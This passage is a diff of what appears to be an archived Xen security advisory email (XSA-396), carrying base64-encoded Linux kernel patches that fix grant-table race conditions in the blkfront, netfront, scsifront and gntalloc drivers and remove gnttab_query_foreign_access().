-Zm8tPmZlYXR1cmVfcGVyc2lzdGVudCkgeworCQkJCQlwcl9hbGVydCgiYmFj
-a2VkIGhhcyBub3QgdW5tYXBwZWQgZ3JhbnQ6ICV1XG4iLAorCQkJCQkJIHMt
-PmluZGlyZWN0X2dyYW50c1tpXS0+Z3JlZik7CisJCQkJCXJldHVybiAtMTsK
-KwkJCQl9CiAJCQkJbGlzdF9hZGQoJnMtPmluZGlyZWN0X2dyYW50c1tpXS0+
-bm9kZSwgJnJpbmZvLT5ncmFudHMpOwogCQkJCXJpbmZvLT5wZXJzaXN0ZW50
-X2dudHNfYysrOwogCQkJfSBlbHNlIHsKIAkJCQlzdHJ1Y3QgcGFnZSAqaW5k
-aXJlY3RfcGFnZTsKIAotCQkJCWdudHRhYl9lbmRfZm9yZWlnbl9hY2Nlc3Mo
-cy0+aW5kaXJlY3RfZ3JhbnRzW2ldLT5ncmVmLCAwLCAwVUwpOwogCQkJCS8q
-CiAJCQkJICogQWRkIHRoZSB1c2VkIGluZGlyZWN0IHBhZ2UgYmFjayB0byB0
-aGUgbGlzdCBvZgogCQkJCSAqIGF2YWlsYWJsZSBwYWdlcyBmb3IgaW5kaXJl
-Y3QgZ3JlZnMuCkBAIC0xNDk4LDcgKzE1MDYsNyBAQCBzdGF0aWMgYm9vbCBi
-bGtpZl9jb21wbGV0aW9uKHVuc2lnbmVkIGxvbmcgKmlkLAogCQl9CiAJfQog
-Ci0JcmV0dXJuIHRydWU7CisJcmV0dXJuIDE7CiB9CiAKIHN0YXRpYyBpcnFy
-ZXR1cm5fdCBibGtpZl9pbnRlcnJ1cHQoaW50IGlycSwgdm9pZCAqZGV2X2lk
-KQpAQCAtMTU2NCwxMiArMTU3MiwxNyBAQCBzdGF0aWMgaXJxcmV0dXJuX3Qg
-YmxraWZfaW50ZXJydXB0KGludCBpcnEsIHZvaWQgKmRldl9pZCkKIAkJfQog
-CiAJCWlmIChicmV0Lm9wZXJhdGlvbiAhPSBCTEtJRl9PUF9ESVNDQVJEKSB7
-CisJCQlpbnQgcmV0OworCiAJCQkvKgogCQkJICogV2UgbWF5IG5lZWQgdG8g
-d2FpdCBmb3IgYW4gZXh0cmEgcmVzcG9uc2UgaWYgdGhlCiAJCQkgKiBJL08g
-cmVxdWVzdCBpcyBzcGxpdCBpbiAyCiAJCQkgKi8KLQkJCWlmICghYmxraWZf
-Y29tcGxldGlvbigmaWQsIHJpbmZvLCAmYnJldCkpCisJCQlyZXQgPSBibGtp
-Zl9jb21wbGV0aW9uKCZpZCwgcmluZm8sICZicmV0KTsKKwkJCWlmICghcmV0
-KQogCQkJCWNvbnRpbnVlOworCQkJaWYgKHVubGlrZWx5KHJldCA8IDApKQor
-CQkJCWdvdG8gZXJyOwogCQl9CiAKIAkJaWYgKGFkZF9pZF90b19mcmVlbGlz
-dChyaW5mbywgaWQpKSB7CkBAIC0xNjc2LDggKzE2ODksNyBAQCBzdGF0aWMg
-aW50IHNldHVwX2Jsa3Jpbmcoc3RydWN0IHhlbmJ1c19kZXZpY2UgKmRldiwK
-IAlmb3IgKGkgPSAwOyBpIDwgaW5mby0+bnJfcmluZ19wYWdlczsgaSsrKQog
-CQlyaW5mby0+cmluZ19yZWZbaV0gPSBHUkFOVF9JTlZBTElEX1JFRjsKIAot
-CXNyaW5nID0gKHN0cnVjdCBibGtpZl9zcmluZyAqKV9fZ2V0X2ZyZWVfcGFn
-ZXMoR0ZQX05PSU8gfCBfX0dGUF9ISUdILAotCQkJCQkJICAgICAgIGdldF9v
-cmRlcihyaW5nX3NpemUpKTsKKwlzcmluZyA9IGFsbG9jX3BhZ2VzX2V4YWN0
-KHJpbmdfc2l6ZSwgR0ZQX05PSU8pOwogCWlmICghc3JpbmcpIHsKIAkJeGVu
-YnVzX2Rldl9mYXRhbChkZXYsIC1FTk9NRU0sICJhbGxvY2F0aW5nIHNoYXJl
-ZCByaW5nIik7CiAJCXJldHVybiAtRU5PTUVNOwpAQCAtMTY4Nyw3ICsxNjk5
-LDcgQEAgc3RhdGljIGludCBzZXR1cF9ibGtyaW5nKHN0cnVjdCB4ZW5idXNf
-ZGV2aWNlICpkZXYsCiAKIAllcnIgPSB4ZW5idXNfZ3JhbnRfcmluZyhkZXYs
-IHJpbmZvLT5yaW5nLnNyaW5nLCBpbmZvLT5ucl9yaW5nX3BhZ2VzLCBncmVm
-KTsKIAlpZiAoZXJyIDwgMCkgewotCQlmcmVlX3BhZ2VzKCh1bnNpZ25lZCBs
-b25nKXNyaW5nLCBnZXRfb3JkZXIocmluZ19zaXplKSk7CisJCWZyZWVfcGFn
-ZXNfZXhhY3Qoc3JpbmcsIHJpbmdfc2l6ZSk7CiAJCXJpbmZvLT5yaW5nLnNy
-aW5nID0gTlVMTDsKIAkJZ290byBmYWlsOwogCX0KQEAgLTI1MzIsMTEgKzI1
-NDQsMTAgQEAgc3RhdGljIHZvaWQgcHVyZ2VfcGVyc2lzdGVudF9ncmFudHMo
-c3RydWN0IGJsa2Zyb250X2luZm8gKmluZm8pCiAJCWxpc3RfZm9yX2VhY2hf
-ZW50cnlfc2FmZShnbnRfbGlzdF9lbnRyeSwgdG1wLCAmcmluZm8tPmdyYW50
-cywKIAkJCQkJIG5vZGUpIHsKIAkJCWlmIChnbnRfbGlzdF9lbnRyeS0+Z3Jl
-ZiA9PSBHUkFOVF9JTlZBTElEX1JFRiB8fAotCQkJICAgIGdudHRhYl9xdWVy
-eV9mb3JlaWduX2FjY2VzcyhnbnRfbGlzdF9lbnRyeS0+Z3JlZikpCisJCQkg
-ICAgIWdudHRhYl90cnlfZW5kX2ZvcmVpZ25fYWNjZXNzKGdudF9saXN0X2Vu
-dHJ5LT5ncmVmKSkKIAkJCQljb250aW51ZTsKIAogCQkJbGlzdF9kZWwoJmdu
-dF9saXN0X2VudHJ5LT5ub2RlKTsKLQkJCWdudHRhYl9lbmRfZm9yZWlnbl9h
-Y2Nlc3MoZ250X2xpc3RfZW50cnktPmdyZWYsIDAsIDBVTCk7CiAJCQlyaW5m
-by0+cGVyc2lzdGVudF9nbnRzX2MtLTsKIAkJCWdudF9saXN0X2VudHJ5LT5n
-cmVmID0gR1JBTlRfSU5WQUxJRF9SRUY7CiAJCQlsaXN0X2FkZF90YWlsKCZn
-bnRfbGlzdF9lbnRyeS0+bm9kZSwgJnJpbmZvLT5ncmFudHMpOwotLSAKMi4z
-NC4xCgo=
-
---=separator
-Content-Type: application/octet-stream; name="xsa396-linux-04.patch"
-Content-Disposition: attachment; filename="xsa396-linux-04.patch"
-Content-Transfer-Encoding: base64
-
-RnJvbSAyMDAwZTVmMjczMTk4NzI0YjVjNDBlYmFlNGQwYWYzYmYxYzcyY2M1
-IE1vbiBTZXAgMTcgMDA6MDA6MDAgMjAwMQpGcm9tOiBKdWVyZ2VuIEdyb3Nz
-IDxqZ3Jvc3NAc3VzZS5jb20+CkRhdGU6IEZyaSwgMjUgRmViIDIwMjIgMTY6
-MDU6NDEgKzAxMDAKU3ViamVjdDogW1BBVENIIDA0LzEyXSB4ZW4vbmV0ZnJv
-bnQ6IGRvbid0IHVzZSBnbnR0YWJfcXVlcnlfZm9yZWlnbl9hY2Nlc3MoKSBm
-b3IgbWFwcGVkIHN0YXR1cwoKSXQgaXNuJ3QgZW5vdWdoIHRvIGNoZWNrIHdo
-ZXRoZXIgYSBncmFudCBpcyBzdGlsbCBiZWluZyBpbiB1c2UgYnkKY2FsbGlu
-ZyBnbnR0YWJfcXVlcnlfZm9yZWlnbl9hY2Nlc3MoKSwgYXMgYSBtYXBwaW5n
-IGNvdWxkIGJlIHJlYWxpemVkCmJ5IHRoZSBvdGhlciBzaWRlIGp1c3QgYWZ0
-ZXIgaGF2aW5nIGNhbGxlZCB0aGF0IGZ1bmN0aW9uLgoKSW4gY2FzZSB0aGUg
-Y2FsbCB3YXMgZG9uZSBpbiBwcmVwYXJhdGlvbiBvZiByZXZva2luZyBhIGdy
-YW50IGl0IGlzCmJldHRlciB0byBkbyBzbyB2aWEgZ250dGFiX2VuZF9mb3Jl
-aWduX2FjY2Vzc19yZWYoKSBhbmQgY2hlY2sgdGhlCnN1Y2Nlc3Mgb2YgdGhh
-dCBvcGVyYXRpb24gaW5zdGVhZC4KClRoaXMgaXMgQ1ZFLTIwMjItMjMwMzcg
-LyBwYXJ0IG9mIFhTQS0zOTYuCgpSZXBvcnRlZC1ieTogRGVtaSBNYXJpZSBP
-YmVub3VyIDxkZW1pQGludmlzaWJsZXRoaW5nc2xhYi5jb20+ClNpZ25lZC1v
-ZmYtYnk6IEp1ZXJnZW4gR3Jvc3MgPGpncm9zc0BzdXNlLmNvbT4KUmV2aWV3
-ZWQtYnk6IEphbiBCZXVsaWNoIDxqYmV1bGljaEBzdXNlLmNvbT4KLS0tCiBk
-cml2ZXJzL25ldC94ZW4tbmV0ZnJvbnQuYyB8IDYgKystLS0tCiAxIGZpbGUg
-Y2hhbmdlZCwgMiBpbnNlcnRpb25zKCspLCA0IGRlbGV0aW9ucygtKQoKZGlm
-ZiAtLWdpdCBhL2RyaXZlcnMvbmV0L3hlbi1uZXRmcm9udC5jIGIvZHJpdmVy
-cy9uZXQveGVuLW5ldGZyb250LmMKaW5kZXggOGIxODI0NmFkOTk5Li43Mjdj
-MDJlYmQxMmYgMTAwNjQ0Ci0tLSBhL2RyaXZlcnMvbmV0L3hlbi1uZXRmcm9u
-dC5jCisrKyBiL2RyaXZlcnMvbmV0L3hlbi1uZXRmcm9udC5jCkBAIC00MjQs
-MTQgKzQyNCwxMiBAQCBzdGF0aWMgYm9vbCB4ZW5uZXRfdHhfYnVmX2djKHN0
-cnVjdCBuZXRmcm9udF9xdWV1ZSAqcXVldWUpCiAJCQlxdWV1ZS0+dHhfbGlu
-a1tpZF0gPSBUWF9MSU5LX05PTkU7CiAJCQlza2IgPSBxdWV1ZS0+dHhfc2ti
-c1tpZF07CiAJCQlxdWV1ZS0+dHhfc2tic1tpZF0gPSBOVUxMOwotCQkJaWYg
-KHVubGlrZWx5KGdudHRhYl9xdWVyeV9mb3JlaWduX2FjY2VzcygKLQkJCQlx
-dWV1ZS0+Z3JhbnRfdHhfcmVmW2lkXSkgIT0gMCkpIHsKKwkJCWlmICh1bmxp
-a2VseSghZ250dGFiX2VuZF9mb3JlaWduX2FjY2Vzc19yZWYoCisJCQkJcXVl
-dWUtPmdyYW50X3R4X3JlZltpZF0sIEdOVE1BUF9yZWFkb25seSkpKSB7CiAJ
-CQkJZGV2X2FsZXJ0KGRldiwKIAkJCQkJICAiR3JhbnQgc3RpbGwgaW4gdXNl
-IGJ5IGJhY2tlbmQgZG9tYWluXG4iKTsKIAkJCQlnb3RvIGVycjsKIAkJCX0K
-LQkJCWdudHRhYl9lbmRfZm9yZWlnbl9hY2Nlc3NfcmVmKAotCQkJCXF1ZXVl
-LT5ncmFudF90eF9yZWZbaWRdLCBHTlRNQVBfcmVhZG9ubHkpOwogCQkJZ250
-dGFiX3JlbGVhc2VfZ3JhbnRfcmVmZXJlbmNlKAogCQkJCSZxdWV1ZS0+Z3Jl
-Zl90eF9oZWFkLCBxdWV1ZS0+Z3JhbnRfdHhfcmVmW2lkXSk7CiAJCQlxdWV1
-ZS0+Z3JhbnRfdHhfcmVmW2lkXSA9IEdSQU5UX0lOVkFMSURfUkVGOwotLSAK
-Mi4zNC4xCgo=
-
---=separator
-Content-Type: application/octet-stream; name="xsa396-linux-05.patch"
-Content-Disposition: attachment; filename="xsa396-linux-05.patch"
-Content-Transfer-Encoding: base64
-
-RnJvbSA5MjE3ZjM5ZDY2OWQwMGQ3YzBkMjRkYThlMmU0ZTUxMGNlZWQzYmMw
-IE1vbiBTZXAgMTcgMDA6MDA6MDAgMjAwMQpGcm9tOiBKdWVyZ2VuIEdyb3Nz
-IDxqZ3Jvc3NAc3VzZS5jb20+CkRhdGU6IEZyaSwgMjUgRmViIDIwMjIgMTY6
-MDU6NDIgKzAxMDAKU3ViamVjdDogW1BBVENIIDA1LzEyXSB4ZW4vc2NzaWZy
-b250OiBkb24ndCB1c2UgZ250dGFiX3F1ZXJ5X2ZvcmVpZ25fYWNjZXNzKCkg
-Zm9yIG1hcHBlZCBzdGF0dXMKCkl0IGlzbid0IGVub3VnaCB0byBjaGVjayB3
-aGV0aGVyIGEgZ3JhbnQgaXMgc3RpbGwgYmVpbmcgaW4gdXNlIGJ5CmNhbGxp
-bmcgZ250dGFiX3F1ZXJ5X2ZvcmVpZ25fYWNjZXNzKCksIGFzIGEgbWFwcGlu
-ZyBjb3VsZCBiZSByZWFsaXplZApieSB0aGUgb3RoZXIgc2lkZSBqdXN0IGFm
-dGVyIGhhdmluZyBjYWxsZWQgdGhhdCBmdW5jdGlvbi4KCkluIGNhc2UgdGhl
-IGNhbGwgd2FzIGRvbmUgaW4gcHJlcGFyYXRpb24gb2YgcmV2b2tpbmcgYSBn
-cmFudCBpdCBpcwpiZXR0ZXIgdG8gZG8gc28gdmlhIGdudHRhYl90cnlfZW5k
-X2ZvcmVpZ25fYWNjZXNzKCkgYW5kIGNoZWNrIHRoZQpzdWNjZXNzIG9mIHRo
-YXQgb3BlcmF0aW9uIGluc3RlYWQuCgpUaGlzIGlzIENWRS0yMDIyLTIzMDM4
-IC8gcGFydCBvZiBYU0EtMzk2LgoKUmVwb3J0ZWQtYnk6IERlbWkgTWFyaWUg
-T2Jlbm91ciA8ZGVtaUBpbnZpc2libGV0aGluZ3NsYWIuY29tPgpTaWduZWQt
-b2ZmLWJ5OiBKdWVyZ2VuIEdyb3NzIDxqZ3Jvc3NAc3VzZS5jb20+ClJldmll
-d2VkLWJ5OiBKYW4gQmV1bGljaCA8amJldWxpY2hAc3VzZS5jb20+Ci0tLQog
-ZHJpdmVycy9zY3NpL3hlbi1zY3NpZnJvbnQuYyB8IDMgKy0tCiAxIGZpbGUg
-Y2hhbmdlZCwgMSBpbnNlcnRpb24oKyksIDIgZGVsZXRpb25zKC0pCgpkaWZm
-IC0tZ2l0IGEvZHJpdmVycy9zY3NpL3hlbi1zY3NpZnJvbnQuYyBiL2RyaXZl
-cnMvc2NzaS94ZW4tc2NzaWZyb250LmMKaW5kZXggMTJjMTBhNWUzZDkzLi43
-ZjQyMTYwMGNiNjYgMTAwNjQ0Ci0tLSBhL2RyaXZlcnMvc2NzaS94ZW4tc2Nz
-aWZyb250LmMKKysrIGIvZHJpdmVycy9zY3NpL3hlbi1zY3NpZnJvbnQuYwpA
-QCAtMjMzLDEyICsyMzMsMTEgQEAgc3RhdGljIHZvaWQgc2NzaWZyb250X2du
-dHRhYl9kb25lKHN0cnVjdCB2c2NzaWZybnRfaW5mbyAqaW5mbywKIAkJcmV0
-dXJuOwogCiAJZm9yIChpID0gMDsgaSA8IHNoYWRvdy0+bnJfZ3JhbnRzOyBp
-KyspIHsKLQkJaWYgKHVubGlrZWx5KGdudHRhYl9xdWVyeV9mb3JlaWduX2Fj
-Y2VzcyhzaGFkb3ctPmdyZWZbaV0pKSkgeworCQlpZiAodW5saWtlbHkoIWdu
-dHRhYl90cnlfZW5kX2ZvcmVpZ25fYWNjZXNzKHNoYWRvdy0+Z3JlZltpXSkp
-KSB7CiAJCQlzaG9zdF9wcmludGsoS0VSTl9BTEVSVCwgaW5mby0+aG9zdCwg
-S0JVSUxEX01PRE5BTUUKIAkJCQkgICAgICJncmFudCBzdGlsbCBpbiB1c2Ug
-YnkgYmFja2VuZFxuIik7CiAJCQlCVUcoKTsKIAkJfQotCQlnbnR0YWJfZW5k
-X2ZvcmVpZ25fYWNjZXNzKHNoYWRvdy0+Z3JlZltpXSwgMCwgMFVMKTsKIAl9
-CiAKIAlrZnJlZShzaGFkb3ctPnNnKTsKLS0gCjIuMzQuMQoK
-
---=separator
-Content-Type: application/octet-stream; name="xsa396-linux-06.patch"
-Content-Disposition: attachment; filename="xsa396-linux-06.patch"
-Content-Transfer-Encoding: base64
-
-RnJvbSBkOGZiNGJmY2ZiMjVkM2E1MzVkOGMxYWVkODJmNTRjMzMwNzE5MDg0
-IE1vbiBTZXAgMTcgMDA6MDA6MDAgMjAwMQpGcm9tOiBKdWVyZ2VuIEdyb3Nz
-IDxqZ3Jvc3NAc3VzZS5jb20+CkRhdGU6IEZyaSwgMjUgRmViIDIwMjIgMTY6
-MDU6NDIgKzAxMDAKU3ViamVjdDogW1BBVENIIDA2LzEyXSB4ZW4vZ250YWxs
-b2M6IGRvbid0IHVzZSBnbnR0YWJfcXVlcnlfZm9yZWlnbl9hY2Nlc3MoKQoK
-VXNpbmcgZ250dGFiX3F1ZXJ5X2ZvcmVpZ25fYWNjZXNzKCkgaXMgdW5zYWZl
-LCBhcyBpdCBpcyByYWN5IGJ5IGRlc2lnbi4KClRoZSB1c2UgY2FzZSBpbiB0
-aGUgZ250YWxsb2MgZHJpdmVyIGlzIG5vdCBuZWVkZWQgYXQgYWxsLiBXaGls
-ZSBhdCBpdApyZXBsYWNlIHRoZSBjYWxsIG9mIGdudHRhYl9lbmRfZm9yZWln
-bl9hY2Nlc3NfcmVmKCkgd2l0aCBhIGNhbGwgb2YKZ250dGFiX2VuZF9mb3Jl
-aWduX2FjY2VzcygpLCB3aGljaCBpcyB3aGF0IGlzIHJlYWxseSB3YW50ZWQg
-dGhlcmUuIEluCmNhc2UgdGhlIGdyYW50IHdhc24ndCB1c2VkIGR1ZSB0byBh
-biBhbGxvY2F0aW9uIGZhaWx1cmUsIGp1c3QgZnJlZSB0aGUKZ3JhbnQgdmlh
-IGdudHRhYl9mcmVlX2dyYW50X3JlZmVyZW5jZSgpLgoKVGhpcyBpcyBDVkUt
-MjAyMi0yMzAzOSAvIHBhcnQgb2YgWFNBLTM5Ni4KClJlcG9ydGVkLWJ5OiBE
-ZW1pIE1hcmllIE9iZW5vdXIgPGRlbWlAaW52aXNpYmxldGhpbmdzbGFiLmNv
-bT4KU2lnbmVkLW9mZi1ieTogSnVlcmdlbiBHcm9zcyA8amdyb3NzQHN1c2Uu
-Y29tPgpSZXZpZXdlZC1ieTogSmFuIEJldWxpY2ggPGpiZXVsaWNoQHN1c2Uu
-Y29tPgotLS0KIGRyaXZlcnMveGVuL2dudGFsbG9jLmMgfCAyNSArKysrKysr
-LS0tLS0tLS0tLS0tLS0tLS0tCiAxIGZpbGUgY2hhbmdlZCwgNyBpbnNlcnRp
-b25zKCspLCAxOCBkZWxldGlvbnMoLSkKCmRpZmYgLS1naXQgYS9kcml2ZXJz
-L3hlbi9nbnRhbGxvYy5jIGIvZHJpdmVycy94ZW4vZ250YWxsb2MuYwppbmRl
-eCAzZmE0MGM3MjNlOGUuLmVkYjBhY2QwYjgzMiAxMDA2NDQKLS0tIGEvZHJp
-dmVycy94ZW4vZ250YWxsb2MuYworKysgYi9kcml2ZXJzL3hlbi9nbnRhbGxv
-Yy5jCkBAIC0xNjksMjAgKzE2OSwxNCBAQCBzdGF0aWMgaW50IGFkZF9ncmVm
-cyhzdHJ1Y3QgaW9jdGxfZ250YWxsb2NfYWxsb2NfZ3JlZiAqb3AsCiAJCV9f
-ZGVsX2dyZWYoZ3JlZik7CiAJfQogCi0JLyogSXQncyBwb3NzaWJsZSBmb3Ig
-dGhlIHRhcmdldCBkb21haW4gdG8gbWFwIHRoZSBqdXN0LWFsbG9jYXRlZCBn
-cmFudAotCSAqIHJlZmVyZW5jZXMgYnkgYmxpbmRseSBndWVzc2luZyB0aGVp
-ciBJRHM7IGlmIHRoaXMgaXMgZG9uZSwgdGhlbgotCSAqIF9fZGVsX2dyZWYg
-d2lsbCBsZWF2ZSB0aGVtIGluIHRoZSBxdWV1ZV9ncmVmIGxpc3QuIFRoZXkg
-bmVlZCB0byBiZQotCSAqIGFkZGVkIHRvIHRoZSBnbG9iYWwgbGlzdCBzbyB0
-aGF0IHdlIGNhbiBmcmVlIHRoZW0gd2hlbiB0aGV5IGFyZSBubwotCSAqIGxv
-bmdlciByZWZlcmVuY2VkLgotCSAqLwotCWlmICh1bmxpa2VseSghbGlzdF9l
-bXB0eSgmcXVldWVfZ3JlZikpKQotCQlsaXN0X3NwbGljZV90YWlsKCZxdWV1
-ZV9ncmVmLCAmZ3JlZl9saXN0KTsKIAltdXRleF91bmxvY2soJmdyZWZfbXV0
-ZXgpOwogCXJldHVybiByYzsKIH0KIAogc3RhdGljIHZvaWQgX19kZWxfZ3Jl
-ZihzdHJ1Y3QgZ250YWxsb2NfZ3JlZiAqZ3JlZikKIHsKKwl1bnNpZ25lZCBs
-b25nIGFkZHI7CisKIAlpZiAoZ3JlZi0+bm90aWZ5LmZsYWdzICYgVU5NQVBf
-Tk9USUZZX0NMRUFSX0JZVEUpIHsKIAkJdWludDhfdCAqdG1wID0ga21hcChn
-cmVmLT5wYWdlKTsKIAkJdG1wW2dyZWYtPm5vdGlmeS5wZ29mZl0gPSAwOwpA
-QCAtMTk2LDIxICsxOTAsMTYgQEAgc3RhdGljIHZvaWQgX19kZWxfZ3JlZihz
-dHJ1Y3QgZ250YWxsb2NfZ3JlZiAqZ3JlZikKIAlncmVmLT5ub3RpZnkuZmxh
-Z3MgPSAwOwogCiAJaWYgKGdyZWYtPmdyZWZfaWQpIHsKLQkJaWYgKGdudHRh
-Yl9xdWVyeV9mb3JlaWduX2FjY2VzcyhncmVmLT5ncmVmX2lkKSkKLQkJCXJl
-dHVybjsKLQotCQlpZiAoIWdudHRhYl9lbmRfZm9yZWlnbl9hY2Nlc3NfcmVm
-KGdyZWYtPmdyZWZfaWQsIDApKQotCQkJcmV0dXJuOwotCi0JCWdudHRhYl9m
-cmVlX2dyYW50X3JlZmVyZW5jZShncmVmLT5ncmVmX2lkKTsKKwkJaWYgKGdy
-ZWYtPnBhZ2UpIHsKKwkJCWFkZHIgPSAodW5zaWduZWQgbG9uZylwYWdlX3Rv
-X3ZpcnQoZ3JlZi0+cGFnZSk7CisJCQlnbnR0YWJfZW5kX2ZvcmVpZ25fYWNj
-ZXNzKGdyZWYtPmdyZWZfaWQsIDAsIGFkZHIpOworCQl9IGVsc2UKKwkJCWdu
-dHRhYl9mcmVlX2dyYW50X3JlZmVyZW5jZShncmVmLT5ncmVmX2lkKTsKIAl9
-CiAKIAlncmVmX3NpemUtLTsKIAlsaXN0X2RlbCgmZ3JlZi0+bmV4dF9ncmVm
-KTsKIAotCWlmIChncmVmLT5wYWdlKQotCQlfX2ZyZWVfcGFnZShncmVmLT5w
-YWdlKTsKLQogCWtmcmVlKGdyZWYpOwogfQogCi0tIAoyLjM0LjEKCg==
-
---=separator
-Content-Type: application/octet-stream; name="xsa396-linux-07.patch"
-Content-Disposition: attachment; filename="xsa396-linux-07.patch"
-Content-Transfer-Encoding: base64
-
-RnJvbSAyNmE3Yzg2ZjY3OWY1NDhmMmE5ZGFhNTdmMGUyN2QyYTNlNDljMTdk
-IE1vbiBTZXAgMTcgMDA6MDA6MDAgMjAwMQpGcm9tOiBKdWVyZ2VuIEdyb3Nz
-IDxqZ3Jvc3NAc3VzZS5jb20+CkRhdGU6IEZyaSwgMjUgRmViIDIwMjIgMTY6
-MDU6NDIgKzAxMDAKU3ViamVjdDogW1BBVENIIDA3LzEyXSB4ZW46IHJlbW92
-ZSBnbnR0YWJfcXVlcnlfZm9yZWlnbl9hY2Nlc3MoKQoKUmVtb3ZlIGdudHRh
-Yl9xdWVyeV9mb3JlaWduX2FjY2VzcygpLCBhcyBpdCBpcyB1bnVzZWQgYW5k
-IHVuc2FmZSB0bwp1c2UuCgpBbGwgcHJldmlvdXMgdXNlIGNhc2VzIGFzc3Vt
-ZWQgYSBncmFudCB3b3VsZCBub3QgYmUgaW4gdXNlIGFmdGVyCmdudHRhYl9x
-dWVyeV9mb3JlaWduX2FjY2VzcygpIHJldHVybmVkIDAuIFRoaXMgaW5mb3Jt
-YXRpb24gaXMgdXNlbGVzcwppbiBiZXN0IGNhc2UsIGFzIGl0IG9ubHkgcmVm
-ZXJzIHRvIGEgc2l0dWF0aW9uIGluIHRoZSBwYXN0LCB3aGljaCBjb3VsZApo
-YXZlIGNoYW5nZWQgYWxyZWFkeS4KClNpZ25lZC1vZmYtYnk6IEp1ZXJnZW4g
-R3Jvc3MgPGpncm9zc0BzdXNlLmNvbT4KUmV2aWV3ZWQtYnk6IEphbiBCZXVs
-aWNoIDxqYmV1bGljaEBzdXNlLmNvbT4KLS0tCiBkcml2ZXJzL3hlbi9ncmFu
-dC10YWJsZS5jIHwgMjUgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogaW5j
-bHVkZS94ZW4vZ3JhbnRfdGFibGUuaCB8ICAyIC0tCiAyIGZpbGVzIGNoYW5n
-ZWQsIDI3IGRlbGV0aW9ucygtKQoKZGlmZiAtLWdpdCBhL2RyaXZlcnMveGVu
-L2dyYW50LXRhYmxlLmMgYi9kcml2ZXJzL3hlbi9ncmFudC10YWJsZS5jCmlu
-ZGV4IDFiODJlN2EzNzIyYS4uZTY1NDg5MTBlNzlmIDEwMDY0NAotLS0gYS9k
-cml2ZXJzL3hlbi9ncmFudC10YWJsZS5jCisrKyBiL2RyaXZlcnMveGVuL2dy
-YW50LXRhYmxlLmMKQEAgLTEzMywxMyArMTMzLDYgQEAgc3RydWN0IGdudHRh
-Yl9vcHMgewogCSAqIHJldHVybiB0aGUgZnJhbWUuCiAJICovCiAJdW5zaWdu
-ZWQgbG9uZyAoKmVuZF9mb3JlaWduX3RyYW5zZmVyX3JlZikoZ3JhbnRfcmVm
-X3QgcmVmKTsKLQkvKgotCSAqIFF1ZXJ5IHRoZSBzdGF0dXMgb2YgYSBncmFu
-dCBlbnRyeS4gUmVmIHBhcmFtZXRlciBpcyByZWZlcmVuY2Ugb2YKLQkgKiBx
-dWVyaWVkIGdyYW50IGVudHJ5LCByZXR1cm4gdmFsdWUgaXMgdGhlIHN0YXR1
-cyBvZiBxdWVyaWVkIGVudHJ5LgotCSAqIERldGFpbGVkIHN0YXR1cyh3cml0
-aW5nL3JlYWRpbmcpIGNhbiBiZSBnb3R0ZW4gZnJvbSB0aGUgcmV0dXJuIHZh
-bHVlCi0JICogYnkgYml0IG9wZXJhdGlvbnMuCi0JICovCi0JaW50ICgqcXVl
-cnlfZm9yZWlnbl9hY2Nlc3MpKGdyYW50X3JlZl90IHJlZik7CiB9OwogCiBz
-dHJ1Y3QgdW5tYXBfcmVmc19jYWxsYmFja19kYXRhIHsKQEAgLTI4NCwyMiAr
-Mjc3LDYgQEAgaW50IGdudHRhYl9ncmFudF9mb3JlaWduX2FjY2Vzcyhkb21p
-ZF90IGRvbWlkLCB1bnNpZ25lZCBsb25nIGZyYW1lLAogfQogRVhQT1JUX1NZ
-TUJPTF9HUEwoZ250dGFiX2dyYW50X2ZvcmVpZ25fYWNjZXNzKTsKIAotc3Rh
-dGljIGludCBnbnR0YWJfcXVlcnlfZm9yZWlnbl9hY2Nlc3NfdjEoZ3JhbnRf
-cmVmX3QgcmVmKQotewotCXJldHVybiBnbnR0YWJfc2hhcmVkLnYxW3JlZl0u
-ZmxhZ3MgJiAoR1RGX3JlYWRpbmd8R1RGX3dyaXRpbmcpOwotfQotCi1zdGF0
-aWMgaW50IGdudHRhYl9xdWVyeV9mb3JlaWduX2FjY2Vzc192MihncmFudF9y
-ZWZfdCByZWYpCi17Ci0JcmV0dXJuIGdyc3RhdHVzW3JlZl0gJiAoR1RGX3Jl
-YWRpbmd8R1RGX3dyaXRpbmcpOwotfQotCi1pbnQgZ250dGFiX3F1ZXJ5X2Zv
-cmVpZ25fYWNjZXNzKGdyYW50X3JlZl90IHJlZikKLXsKLQlyZXR1cm4gZ250
-dGFiX2ludGVyZmFjZS0+cXVlcnlfZm9yZWlnbl9hY2Nlc3MocmVmKTsKLX0K
-LUVYUE9SVF9TWU1CT0xfR1BMKGdudHRhYl9xdWVyeV9mb3JlaWduX2FjY2Vz
-cyk7Ci0KIHN0YXRpYyBpbnQgZ250dGFiX2VuZF9mb3JlaWduX2FjY2Vzc19y
-ZWZfdjEoZ3JhbnRfcmVmX3QgcmVmLCBpbnQgcmVhZG9ubHkpCiB7CiAJdTE2
-IGZsYWdzLCBuZmxhZ3M7CkBAIC0xNDI3LDcgKzE0MDQsNiBAQCBzdGF0aWMg
-Y29uc3Qgc3RydWN0IGdudHRhYl9vcHMgZ250dGFiX3YxX29wcyA9IHsKIAku
-dXBkYXRlX2VudHJ5CQkJPSBnbnR0YWJfdXBkYXRlX2VudHJ5X3YxLAogCS5l
-bmRfZm9yZWlnbl9hY2Nlc3NfcmVmCQk9IGdudHRhYl9lbmRfZm9yZWlnbl9h
-Y2Nlc3NfcmVmX3YxLAogCS5lbmRfZm9yZWlnbl90cmFuc2Zlcl9yZWYJPSBn
-bnR0YWJfZW5kX2ZvcmVpZ25fdHJhbnNmZXJfcmVmX3YxLAotCS5xdWVyeV9m
-b3JlaWduX2FjY2VzcwkJPSBnbnR0YWJfcXVlcnlfZm9yZWlnbl9hY2Nlc3Nf
-djEsCiB9OwogCiBzdGF0aWMgY29uc3Qgc3RydWN0IGdudHRhYl9vcHMgZ250
-dGFiX3YyX29wcyA9IHsKQEAgLTE0MzksNyArMTQxNSw2IEBAIHN0YXRpYyBj
-b25zdCBzdHJ1Y3QgZ250dGFiX29wcyBnbnR0YWJfdjJfb3BzID0gewogCS51
-cGRhdGVfZW50cnkJCQk9IGdudHRhYl91cGRhdGVfZW50cnlfdjIsCiAJLmVu
-ZF9mb3JlaWduX2FjY2Vzc19yZWYJCT0gZ250dGFiX2VuZF9mb3JlaWduX2Fj
-Y2Vzc19yZWZfdjIsCiAJLmVuZF9mb3JlaWduX3RyYW5zZmVyX3JlZgk9IGdu
-dHRhYl9lbmRfZm9yZWlnbl90cmFuc2Zlcl9yZWZfdjIsCi0JLnF1ZXJ5X2Zv
